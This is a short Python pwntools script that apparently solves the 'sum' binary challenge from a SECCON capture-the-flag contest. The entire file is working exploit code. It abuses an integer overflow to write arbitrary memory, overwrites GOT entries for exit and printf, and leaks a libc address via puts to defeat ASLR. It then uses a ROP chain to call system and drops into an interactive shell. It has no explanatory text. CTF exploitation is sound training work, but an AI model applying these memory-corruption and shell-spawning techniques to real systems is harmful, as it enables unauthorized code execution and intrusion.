from pwn import *

# target = remote("sum.chal.seccon.jp", 10001)
target = process('sum_ccafa40ee6a5a675341787636292bf3c84d17264')

elf = ELF('sum_ccafa40ee6a5a675341787636292bf3c84d17264')
libc = ELF("libc.so.6")

main = elf.symbols['main']
popRdi = 0x400a43

def write(adr, value):
    target.sendline("9223372036854775807")
    target.sendline(str(0x7fffffffffffffff - adr))
    target.sendline("1")
    target.sendline("1")
    target.sendline(str(value))
    target.sendline(str(adr))

write(elf.got['exit'], main)
write(elf.got['printf'], popRdi)
target.sendline(str(popRdi))
target.sendline(str(elf.got['puts']))
target.sendline(str(elf.symbols['puts']))
target.sendline(str(0x4009a7))
target.sendline("0")

for i in range(0, 18):
    print(target.recvline())

leak = target.recvline().strip(b"\n")
leak = u64(leak + b"\x00"*(8-len(leak)))
base = leak - libc.symbols["puts"]

print("base is: " + hex(base))

target.sendline(str(popRdi))
target.sendline(str(base + 0x1AFEA4))
target.sendline(str(base + libc.symbols["system"]))
target.sendline("0")

target.interactive()
